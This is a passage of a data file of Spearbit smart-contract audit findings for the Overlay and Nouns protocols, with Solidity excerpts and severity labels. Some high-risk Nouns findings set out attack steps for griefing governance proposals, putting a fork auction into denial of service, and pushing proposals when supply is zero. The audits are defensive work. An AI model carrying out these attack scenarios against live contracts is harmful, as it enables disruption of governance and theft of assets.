valid ,! _ovlWethPool address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); require( _ovlWethToken0 == WETH || _ovlWethToken1 == WETH, \"OVLV1Feed: ovlWethToken != WETH\" ); require( _ovlWethToken0 == _ovl || _ovlWethToken1 == _ovl, // What if _ovl == WETH ? \"OVLV1Feed: ovlWethToken != OVL\" ); ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; marketPool = _marketPool; ovlWethPool = _ovlWethPool; ovl = _ovl; }", "labels": ["Spearbit", "Overlay", "Severity: Medium Risk"]}, {"title": "Liquidatable positions can be unwound by the owner of the position", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidation function can be front-runned since it does not require any deposits. In particular, the liquidation function can be front-runned by the owner of the position by calling unwind. This effectively means that users can prevent themselves from getting liquidated by watching the mempool and frontrunning calls to their liquidation position by calling unwind. Although this behaviour is similar to liquidations in lending protocols where a borrower can front-run a liquidation by repaying the borrow, the lack of collateral requirements for both unwind and liquidation makes this case special. Note: In practice, transactions for liquidations do not end up in the public mempool and are often sent via private relays such as flashbots. Therefore, a scenario where the user finds out about a liquidatable position by the public mempool is likely not common. However, a similar argument still applies. Note: Overlay also allows the owner of the position to be the liquidator, unlike other protocols like compound. The difference in price computation for the liquidation and unwind mechanism may make it better for users to liquidate themselves rather than unwinding their position. However, a check similar to compound is not effective at preventing this issue since users can always liquidate themselves from another address.", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Adding constructor params causes creation code to change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Using constructor parameters in create2 makes the construction code different for every case. This makes address calculation more complex as you first have to calculate the construction code, hash it and then do address calculation. Whats worse is that Etherscan does not properly support auto-verification of contracts deployed via create2 with different creation code. Youll have to manually verify all markets individually. Additionally, needless salt in OverlayV1Factory.sol#L129.", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Potential wrap of timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "In the transform() function, a revert could occur right after timestamp32 has wrapped (e.g. when timestamp > 2**32). function transform(... , uint256 timestamp, ...) ... { uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32 ... uint256 dt = uint256(timestamp32 - self.timestamp); // could revert if timestamp32 has just wrapped ... }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Verify the validity of _microWindow and _macroWindow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The constructor of OverlayV1Feed doesnt verify the validity of _microWindow and _macroWindow, potentially causing the price oracle to produce bad results if misconfigured. constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Simplify _midFromFeed()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The calculation in _midFromFeed() is more complicated than necessary because: min(x,y) + max(x,y) == x + y. More importantly, the average operation (bid + ask) / 2 can overflow and revert if bid + ask >= 2**256. function _midFromFeed(Oracle.Data memory data) private view returns (uint256 mid_) { uint256 bid = Math.min(data.priceOverMicroWindow, data.priceOverMacroWindow); uint256 ask = Math.max(data.priceOverMicroWindow, data.priceOverMacroWindow); mid_ = (bid + ask) / 2; }", "labels": ["Spearbit", "Overlay", "Severity: Low Risk"]}, {"title": "Use implicit truncation of timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Solidity will truncate data when it is typecast to a smaller data type, see solidity explicit-conversions. This can be used to simplify the following statement: uint32 timestamp32 = uint32(timestamp % 2**32); // mod to fit in uint32", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Set pos.entryPrice to 0 after liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidate() function sets most of the values of pos to 0, with the exception of pos.entryPrice. function liquidate(address owner, uint256 positionId) external { ... // store the updated position info data. mark as liquidated pos.notional = 0; pos.debt = 0; pos.oiShares = 0; pos.liquidated = true; positions.set(owner, positionId, pos); ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Store result of expression in temporary variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Several gas optimizations are possible by storing the result of an expression in a temporary variable, such as the value of oiFromNotional(data, capNotionalAdjusted). 10 function build( ... ) { ... uint256 price = isLong ? ask(data, _registerVolumeAsk(data, oi, oiFromNotional(data, capNotionalAdjusted))) : bid(data, _registerVolumeBid(data, oi, oiFromNotional(data, capNotionalAdjusted))); ... require(oiTotalOnSide <= oiFromNotional(data, capNotionalAdjusted), \"OVLV1:oi>cap\"); }  A: The value of pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) could be stored in a temporary variable to save gas.  B: The value of oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) could also be stored in a temporary variable to save gas and make the code more readable.  C: The value of pos.oiSharesCurrent(fraction) could be stored in a temporary variable to save gas. function unwind(...) ... { ... uint256 price = pos.isLong ? bid( data, _registerVolumeBid( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A1 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B1 ) ) : ask( data, _registerVolumeAsk( data, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide), // A2 oiFromNotional(data, capNotionalAdjustedForBounds(data, capNotional)) // B2 ) ); ... if (pos.isLong) { oiLong -= Math.min( oiLong, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A3 ); oiLongShares -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); // C1 } else { oiShort -= Math.min( oiShort, pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide) // A4 ); oiShortShares -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); // C2 } ... pos.oiShares -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); // C3 } The value of 2 * k * timeElapsed could also be stored in a temporary variable: 11 function oiAfterFunding( ...) ... { ... if (2 * k * timeElapsed < MAX_NATURAL_EXPONENT) { fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Flatten code of OverlayV1UniswapV3Feed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Functions _fetch(), _inputsToConsultMarketPool(), _inputsToConsultOvlWethPool() and con- sult() do a lot of interactions with small arrays and loops over them, increasing overhead and reading difficulty.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Replace memory with calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "External calls to functions with memory parameters can be made more gas efficient by replacing memory with calldata, as long as the memory parameters are not modified.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "No need to cache immutable values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Variables microWindow and macroWindow are immutable, so it is not necessary to cache them because the compiler inlines their value. contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { function _fetch() internal view virtual override returns (Oracle.Data memory) { // cache micro and macro windows for gas savings uint256 _microWindow = microWindow; uint256 _macroWindow = macroWindow; ... } } abstract contract OverlayV1Feed is IOverlayV1Feed { ... uint256 public immutable microWindow; uint256 public immutable macroWindow; ... constructor(uint256 _microWindow, uint256 _macroWindow) { microWindow = _microWindow; macroWindow = _macroWindow; } }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Simplify circuitBreaker", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function circuitBreaker() does a divDown() which can be circumvented to save gas and improving readability. function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) ... { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (uint256(minted).divDown(_circuitBreakerMintTarget) >= 2 * ONE) { return 0; } ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Optimizations if data.macroWindow is constant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Several checks are done in contract OverlayV1Market which involve data.macroWindow in combi- nation with a linear calculation. If data.macroWindow does not change (as is the case with the UniswapV3 feed), it is possible to optimize the calculations by precalculating several values.", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Remove unused / redundant functions and variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Functions nextPositionId() and mid() in OverlayV1Market.sol are not used internally and dont appear to be useful. contract OverlayV1Market is IOverlayV1Market { function nextPositionId() external view returns (uint256) { return _totalPositions; } function mid(Oracle.Data memory data,uint256 volumeBid,uint256 volumeAsk) ... { ... } } The functions oiInitial() and oiSharesCurrent() in library Position.sol have the same implementation. The oiInitial() function does not seem useful as it retrieves current positions and not initial ones. library Position { /// @notice Computes the initial open interest of position when built ... function oiInitial(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } /// @notice Computes the current shares of open interest position holds ... function oiSharesCurrent(Info memory self, uint256 fraction) internal pure returns (uint256) { return _oiShares(self).mulUp(fraction); } } 15 The function liquidationPrice() in library Position.sol is not used from the contracts. Because it type is internal it cannot be called from the outside either. library Position { function liquidationPrice(... ) internal pure returns (uint256 liqPrice_) { ... } } The variables ovlWethToken0 and ovlWethToken1 are stored but not used anymore. constructor(..., address _ovlWethPool,...) .. { ... // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); address _ovlWethToken1 = IUniswapV3Pool(_ovlWethPool).token1(); ... ovlWethToken0 = _ovlWethToken0; ovlWethToken1 = _ovlWethToken1; ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization OverlayV1Market.sol#L536-L539,"]}, {"title": "Optimize power functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "In contract OverlayV1Market.sol, several power calculations are done with EULER / INVERSE_EULER as a base which can be optimized to save gas. function dataIsValid(Oracle.Data memory data) public view returns (bool) { ... uint256 dpLowerLimit = INVERSE_EULER.powUp(pow); uint256 dpUpperLimit = EULER.powUp(pow); ... } Note: As the Overlay team confirmed, less precision might be sufficient for this calculation. OverlayV1Market.sol: fundingFactor = INVERSE_EULER.powDown(2 * k * timeElapsed); OverlayV1Market.sol: bid_ = bid_.mulDown(INVERSE_EULER.powUp(pow)); OverlayV1Market.sol: ask_ = ask_.mulUp(EULER.powUp(pow)); 16", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Redundant Math.min()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function capNotionalAdjustedForCircuitBreaker() calculates circuitBreaker() and then does a Math.min(cap,...) with the result. However circuitBreaker() already returns a value that is <= cap. So the Math.min(...) function is unnecesary. 17 function capNotionalAdjustedForCircuitBreaker(uint256 cap) public view returns (uint256) { ... cap = Math.min(cap, circuitBreaker(snapshot, cap)); return cap; } function circuitBreaker(Roller.Snapshot memory snapshot, uint256 cap) public view returns (uint256) { ... if (minted <= int256(_circuitBreakerMintTarget)) { return cap; } else if (...) { return 0; } // so minted > _circuitBreakerMintTarget, thus minted / _circuitBreakerMintTarget > ONE ... uint256 adjustment = 2 * ONE - uint256(minted).divDown(_circuitBreakerMintTarget); // so adjustment <= ONE return cap.mulDown(adjustment); // so this is <= cap }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Replace square with multiplication", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The contract OverlayV1Market.sol contains the following expression several times: x.powDown(2 * ONE). This computes the square of x. However, it can also be calculated in a more gas efficient way: function oiAfterFunding(...) { ... uint256 underRoot = ONE - oiImbalanceBefore.divDown(oiTotalBefore).powDown(2 * ONE).mulDown( ONE - fundingFactor.powDown(2 * ONE) ); ... }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Retrieve roles via constants in import", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Within contract OverlayV1Factory.sol, the roles GOVERNOR_ROLE, MINTER_ROLE, BURNER_ROLE are retrieved via an external function call. To save gas they could also be retrieved as constants via import. Additionally, a role ADMIN_ROLE is defined in contract OverlayV1Token.sol, which is the same as DEFAULT_ADMIN_- ROLE of AccessControl.sol. This ADMIN_ROLE could be replaced with DEFAULT_ADMIN_ROLE. modifier onlyGovernor() { - + require(ovl.hasRole(ovl.GOVERNOR_ROLE(), msg.sender), \"OVLV1: !governor\"); require(ovl.hasRole(GOVERNOR_ROLE, msg.sender), \"OVLV1: !governor\"); _; } ... function deployMarket(...) { ... ovl.grantRole(ovl.MINTER_ROLE(), market_); ovl.grantRole(MINTER_ROLE, market_); ovl.grantRole(ovl.BURNER_ROLE(), market_); ovl.grantRole(BURNER_ROLE, market_); ... - + - + }", "labels": ["Spearbit", "Overlay", "Severity: Gas Optimization"]}, {"title": "Double check action when snapAccumulator == 0 in transform()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function transform() does a check for snapAccumulator + value == 0 (where all variables are of type int256). This could be true if value == -snapAccumulator (or snapAccumulator == value == 0) A comment shows this is to prevent division by 0 later on. The division is based on abs(snapAccumulator) + abs(value). So this will only fail when snapAccumulator == value == 0. function transform(...) ... { ... int256 accumulatorNow = snapAccumulator + value; if (accumulatorNow == 0) { // if accumulator now is zero, windowNow is simply window // to avoid 0/0 case below return ... ---> this comment might not be accurate } ... uint256 w1 = uint256(snapAccumulator >= 0 ? snapAccumulator : -snapAccumulator); // w1 = abs(snapAccumulator) uint256 w2 = uint256(value >= 0 ? value : -value); uint256 windowNow = (w1 * (snapWindow - dt) + w2 * window) / (w1 + w2); // only fails if w1 == w2 == 0 ... // w2 = abs(value) ,! ,! }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Add unchecked in natural log (ln) function or remove the functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function ln() in contract LogExpMath.sol does not use unchecked, while the function log() does. Note: Neither ln() nor log() are used, so they could also be deleted. function log(int256 arg, int256 base) internal pure returns (int256) { unchecked { ... } } function ln(int256 a) internal pure returns (int256) { // no unchecked }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Specialized functions for the long and short side", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The functions build(), unwind() and liquidate() contain a large percentage of code that is differ- ent for the long and short side.", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Beware of chain dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The contracts have a few dependencies/assumptions which arent future proof and/or limit on which chain the code can be deployed. The AVERAGE_BLOCK_TIME is different on several EVM based chains. As the the Ethereum mainchain, the AVER- AGE_BLOCK_TIME will change to 12 seconds after the merge. contract OverlayV1Market is IOverlayV1Market { ... uint256 internal constant AVERAGE_BLOCK_TIME = 14; // (BAD) TODO: remove since not futureproof ... } WETH addresses are not the same on different chains. See Uniswap Wrapped Native Token Addresses. Note: Several chains have a different native token instead of ETH. 21 contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; ... }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Move _registerMint() closer to mint() and burn()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Within functions unwind() and liquidate() there is a call to _registerMint() as well as calls to ovl.mint() and ovl.burn(). However these two are quite a few lines apart so it is not immediately obvious they are related and operate on the same values. Additionally _registerMint() also registers burns. function unwind(...) ... { ... _registerMint(int256(value) - int256(cost)); ... // 40 lines of code if (value >= cost) { ovl.mint(address(this), value - cost); } else { ovl.burn(cost - value); } ... } function liquidate(address owner, uint256 positionId) external { ... _registerMint(int256(value) - int256(cost)); ... // 33 lines of code ovl.burn(cost - value); ... }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Use of Math.min() is error-prone", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Function Math.min() is used in two ways:  To get the smallest of two values, e.g. x = Math.min(x,y);  To make sure the resulting value is >=0, e.g. x -= Math.min(x,y); (note, there is an extra - in -= ) It is easy to make a mistake because both constructs are rather similar. Note: No mistakes have been found in the code. Examples to get the smallest of two values: OverlayV1Market.sol: tradingFee OverlayV1Market.sol: cap OverlayV1Market.sol: cap = Math.min(tradingFee, value); = Math.min(cap, circuitBreaker(snapshot, cap)); = Math.min(cap, backRunBound(data)); Examples to make sure the resulting value is >=0: OverlayV1Market.sol: oiLong -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares OverlayV1Market.sol: pos.notional OverlayV1Market.sol: pos.debt OverlayV1Market.sol: pos.oiShares OverlayV1Market.sol: oiLong oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiLongShares OverlayV1Market.sol: oiShort oiTotalSharesOnSide)); ,! OverlayV1Market.sol: oiShortShares Position.sol: posCost -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= uint120( Math.min(pos.notional, pos.notionalInitial(fraction))); -= uint120( Math.min(pos.debt, pos.debtCurrent(fraction))); -= Math.min(pos.oiShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiLong,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiLongShares, pos.oiSharesCurrent(fraction)); -= Math.min(oiShort,pos.oiCurrent(fraction, oiTotalOnSide, -= Math.min(oiShortShares, pos.oiSharesCurrent(fraction)); -= Math.min(posCost, posDebt);", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Confusing use of term burn", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function oiAfterFunding() contains a comment that it burns a portion of the contracts. The term burn can be confused with burning of OVL. The Overlay team clarified that: The total aggregate open interest outstanding (oiLong + oiShort) on the market decreases over time with funding. Theres no actual burning of OVL. function oiAfterFunding(...) ... { ... // Burn portion of all aggregate contracts (i.e. oiLong + oiShort) // to compensate protocol for pro-rata share of imbalance liability ... return (oiOverweightNow, oiUnderweightNow); }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Document precondition for oiAfterFunding()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Function oiAfterFunding contains the following statement: uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; Nevertheless, if oiOverweightBefore < oiUnderweightBefore then statement will revert. Luckily, the update() function makes sure this isnt the case. function oiAfterFunding(uint256 oiOverweightBefore, uint256 oiUnderweightBefore, ...) ... { ... uint256 oiImbalanceBefore = oiOverweightBefore - oiUnderweightBefore; // Could if oiOverweightBefore < oiUnderweightBefore ... } function update() public returns (Oracle.Data memory) { ... bool isLongOverweight = oiLong > oiShort; uint256 oiOverweight two uint256 oiUnderweight = isLongOverweight ? oiShort : the two (oiOverweight, oiUnderweight) = oiAfterFunding(oiOverweight, oiUnderweight, ...); ... = isLongOverweight ? oiLong : oiShort; // oiOverweight is the largest of the oiLong; // oiUnderweight is the smallest of ,! ,! }", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Format numbers intelligibly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Solidity offers several possibilities to format numbers in a more readable way as noted below.", "labels": ["Spearbit", "Overlay", "Severity: Informational"]}, {"title": "Any signer can cancel a pending/active proposal to grief the proposal process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Any proposal signer, besides the proposer, can cancel the proposal later irrespective of the number of votes they contributed earlier towards the threshold. The signer could even have zero votes because getPrior- Votes(signer,..) is not checked for a non-zero value in verifySignersCanBackThisProposalAndCountTheir- Votes() as part of the proposeBySigs() flow. This seems to be a limitation of the design described in hackmd.io/@el4d/nouns-dao-v3-spec#Cancel. With the signature-based scheme, every signer is as powerful as the proposer. As long as their combined votes meets threshold, it does not matter who contributed how much to the voting power. And assuming everyone contributed some non-zero power, they are all given the cancellation capability. However, for example, a signer/proposer with 0 voting power is treated on par with any other signer who contributed 10 Nouns towards meeting the proposal threshold. A malicious signer can sign-off on every valid proposal to later cancel it. The vulnerability arises from a lack of voting power check on signer and the cancel capability given to any signer. Example scenario: Evil, without having to own a single Noun, creates a valid signature to back every signature- based proposal from a different account (to bypass checkNoActiveProp()) and gets it included in the proposal creation process via proposeBySigs(). Evil then cancels every such proposal at will, i.e. no signature-based proposal that Evil manages to get included into, potentially all of them, will ever get executed. Impact: This allows a malicious griefing signer who could really be anyone without having to own any Nouns but manages to get their signature included in the proposeBySigs() to cancel that proposal later. This effectively gives anyone a veto power on all signature-based proposals. High likelihood + Medium impact = High severity.  Likelihood is High because anyone with no special ownership (of Nouns) or special roles in the protocol frontend could initiate a signature to be accepted by the proposer. We assume no other checks by e.g. because those are out-of-scope, not specified/documented, depend on the implementation, depend on their trust/threat models or may be bypassed with protocol actors interacting directly with the contracts. We cannot be sure of how the proposer decides on which signatures to include and what checks are actually made, be- cause that is done offchain. Without that information, we are assuming that proposer includes all signatures they receive.  Impact is Medium because, with the Likelihood rationale, anyone can get their signature included to later cancel a signature-backed proposal, which in the worst case (again without additional checks/logic) gives anyone a veto power on all signature-based proposals to potentially bring governance to a standstill if sig- natures are expected to be the dominant approach forward. Even if we assume that a proposer learns to exclude a zero-vote cancelling signer (with external checks) after experiencing this griefing, the signer can move on to other unsuspecting proposers. Given that this is one of the key features of V3 UX, we reason that this permissionless griefing DoS on governance to be at Medium impact. While the cancellation capability is indeed specified as the intended design, we reason that this is a risky feature for the reasons explained above. This should ideally be determined based only on the contributing voting power as suggested in our recommendation. Filtering out signers with zero voting power raises the bar from the current situation in requiring signers to have non-zero voting power (i.e. cost of griefing attack becomes non-zero) but will not prevent signers from transferring their voting power granting Noun(s) to other addresses, get new valid signatures included on other signature-based proposals and grief them later by cancelling. Equating a non-zero voting power to a veto power on all signature-based proposals in the protocol continues to be very risky.", "labels": ["Spearbit", "Nouns", "Severity: High Risk"]}, {"title": "Potential Denial of Service (DoS) attack on NounsAuctionHouseFork Contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The potential vulnerability arises during the initialization of the NounsAuctionHouseFork contract, which is deployed and initialized via the executeFork() function when a new fork is created. At this stage, the state variable startNounId within the NounsTokenFork contract is set corresponding to the nounId currently being auctioned in the NounsAuctionHouse. It should be noted that the NounsAuctionHouseFork contract is initially in a paused state and requires a successful proposal to unpause it, thus enabling the minting of new nouns tokens within the fork. Based on the current structure, an attacker can execute a DoS attack through the following steps: 7 1. Assume the executeFork() threshold is 7 nouns and the attacker owns 8 nouns. The current nounId being auctioned is 735. 2. The attacker places the highest bid for nounId 735 in the NounsAuctionHouse contract and waits for the auction's conclusion. 3. Once the auction concludes, the attacker calls escrowToFork() with his 8 nouns, triggering the execute- Fork() threshold. 4. Upon invoking executeFork(), new fork contracts are deployed. Below is the state of both NounsAuction- HouseFork and NounsAuctionHouse contracts at this juncture: NounsAuctionHouseFork state: nounId -> 0 amount -> 0 startTime -> 0 endTime -> 0 bidder -> 0x0000000000000000000000000000000000000000 settled -> false NounsAuctionHouse state: nounId -> 735 amount -> 50000000000000000000 startTime -> 1686014675 endTime -> 1686101075 bidder -> 0xE6b3367318C5e11a6eED3Cd0D850eC06A02E9b90 (attacker's address) settled -> false 5. The attacker executes settleCurrentAndCreateNewAuction() on the NounsAuctionHouse contract, thereby acquiring the nounId 735. 6. Following this, the attacker invokes joinFork() on the main DAO and joins the fork with nounId 735. This action effectively mints nounId 735 within the fork and subsequently triggers a DoS state in the NounsAuc- tionHouseFork contract. 7. At a later time, a proposal is successfully passed and the unpause() function is called on the NounsAuction- HouseFork contract. 8. A revert occurs when the _createAuction() function tries to mint tokenId 735 in the fork (which was already minted during the joinFork() call), thus re-pausing the contract. More broadly, this could happen if the buyer of the fork DAO's startNounId (and successive ones) on the original DAO (i.e. the first Nouns that get auctioned after a fork is executed) joins the fork with those tokens, even without any malicious intent, before the fork's auction is unpaused by its governance. Applying of delayed governance on fork DAO makes this timing-based behavior more feasible. One has to buy one or more of the original DAO tokens auctioned after the fork was executed and use them to join the fork immediately. The NounsAuctionHouseFork contract gets into a DoS state, necessitating a contract update in the NounsToken- Fork contract to manually increase the _currentNounId state variable to restore the normal flow in the NounsAuc- tionHouseFork. High likelihood + Medium impact = High Severity. Likelihood: High, because its a very likely scenario to happen, even unintentionally, the scenario can be triggered by a non-malicious user that just wants to join the fork with a fresh bought Noun from the auction house. Impact: Medium, because forking is bricked for at least several weeks until the upgrade proposal passes and is in place. This is not simply having a contract disabled for a period of time, this can be considered as a loss of assets for the Forked DAO as well, i.e. imagine that the Forked DAO needs funding immediately. On top of this, the contract upgrade would have to be done on the NounsTokenFork contract to correct the _currentNounId state variable to a valid value and fix the Denial of Service in the NounsAuctionHouseFork. Would the fork joiners be willing to perform such a risky update in such a critical contract?", "labels": ["Spearbit", "Nouns", "Severity: High Risk"]}, {"title": "Total supply can be low down to zero after the fork, allowing for execution of exploiting proposals from any next joiners", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Total supply can be low down to reaching zero during forking period, so any holder then entering forked DAO with joinFork() can push manipulating proposals and force all the later joiners either to rage quit or to be exploited. As an example, if there is a group of nouns holders that performed fork for pure financial reasons, all claimed forked nouns and quitted. Right after that it is block.timestamp < forkingPeriodEndTimestamp, so isForkPe- riodActive(ds) == true in original DAO contract. In the same time forked token's adjustedTotalSupply is zero (all new tokens were sent to timelock):  NounsDAOLogicV1Fork.sol#L201-L208 function quit(uint256[] calldata tokenIds) external nonReentrant { ... for (uint256 i = 0; i < tokenIds.length; i++) { >> nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); }  NounsDAOLogicV1Fork.sol#L742-L744 function adjustedTotalSupply() public view returns (uint256) { return nouns.totalSupply() - nouns.balanceOf(address(timelock)); } Also, NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() check does not revert in the forked DAO contract:  NounsDAOLogicV1Fork.sol#L346-L349) function checkGovernanceActive() internal view { if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > ,! 0) revert WaitingForTokensToClaimOrExpiration(); } Original DAO holders can enter new DAO with joinFork() only, that will keep checkGovernanceActive() non- reverting in the forked DAO contract: 9  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { ... for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } >> NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } As remainingTokensToClaim stays zero as claimDuringForkPeriod() doesn't affect it:  NounsTokenFork.sol#L166-L174 function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } In this situation both quorum and proposal thresholds will be zero, proposals can be created with creationBlock = block.number, at which only recently joined holder have voting power:  NounsDAOLogicV1Fork.sol#L242-L305 function propose( address[] memory targets, uint256[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description ) public returns (uint256) { checkGovernanceActive(); ProposalTemp memory temp; temp.totalSupply = adjustedTotalSupply(); >> temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply); require( nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold, 'NounsDAO::propose: proposer votes below proposal threshold' ); ... newProposal.proposalThreshold = temp.proposalThreshold; newProposal.quorumVotes = bps2Uint(quorumVotesBPS, temp.totalSupply); ... 